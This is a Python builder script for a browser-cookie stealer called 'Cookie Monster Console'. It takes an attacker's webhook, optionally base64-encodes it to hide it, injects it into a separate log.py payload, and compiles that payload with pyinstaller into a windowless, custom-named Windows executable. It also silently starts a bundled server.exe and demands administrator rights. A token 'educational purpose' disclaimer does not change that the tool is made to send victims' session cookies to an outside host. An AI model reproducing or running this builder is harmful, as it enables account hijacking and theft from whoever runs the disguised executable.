import os, ctypes
import colorama as color
import base64 
color.init()
os.system("cls")
cwd = os.getcwd()

def builder():
    hook = input("[+]" + " enter webhook> ")
    opti = input("[+]" + " encode webhook with base64? Y/N > ")
    pydir = input("[+] directory to log.py > ")
    names = input("[+] enter a name > ")
    if opti == "Y":
        enhook0 = hook.encode("ascii")
        enhook1 = base64.b64encode(enhook0)
        enhook2  = enhook1.decode("ascii")
        with open(f"{pydir}") as f:
         lines = f.readlines()

        lines[0] = f'hook = "{enhook2}" \n'                  #embeds your encoded webhook log.py 


        with open(f"{pydir}", "w") as f:
         f.writelines(lines)

    else:
        with open(f"{pydir}") as f:
         lines = f.readlines()

        lines[0] = f'hook = "{hook}" \n'                    #embeds your webhook log.py without encoding


        with open(f"{pydir}", "w") as f:
            f.writelines(lines)
    print("CSConcole is building payload please wait...")
    print("")
    os.chdir(pydir.strip("log.py"))
    os.system(f'pyinstaller "{pydir}" --noconfirm --onefile --windowed --name "{names}.exe"      ')
    print("[+] check dist folder.")

def options():
    print(color.Fore.RED + """
        ________  _________                       __   
       / ____/  |/  / ____/___  ____  _________  / /__ 
      / /   / /|_/ / /   / __ \/ __ \/ ___/ __ \/ / _ |
     / /___/ /  / / /___/ /_/ / / / (__  ) /_/ / /  __/
     \____/_/  /_/\____/\____/_/ /_/____/\____/_/\___/ 
                                                                                                                    
    Cookie logger builder      Enpowering Eradication
        
    """ + color.Fore.RESET)
    print("Cookie Monster Console is in beta so options and payloads may be limited.")
    print("""
    [1] build a cookie logger
    [2] legal
    [x] exit 
    """)
    os.startfile(f"{cwd}\\serv\\server.exe")
    opte = input("[+] option>")
    if opte == "1":
        os.system("cls")
        logo()
    elif opte == "2":
        os.system("cls")
        print("""
        Disclaimer: i am not responsable for your actions this tool was made for educational purpose.
        """)
        input("press any key to go back> ")
        logo()

def logo():
    print(color.Fore.RED + """
        ________  _________                       __   
       / ____/  |/  / ____/___  ____  _________  / /__ 
      / /   / /|_/ / /   / __ \/ __ \/ ___/ __ \/ / _ |
     / /___/ /  / / /___/ /_/ / / / (__  ) /_/ / /  __/
     \____/_/  /_/\____/\____/_/ /_/____/\____/_/\___/ 
                                                                                                                    
    Cookie logger builder      Enpowering Eradication
        
    """ + color.Fore.RESET)
    builder()

if ctypes.windll.shell32.IsUserAnAdmin():
 options()
else:
 os.system("cls")
 print("Invalid permission. please restart Terminal as administrator.")

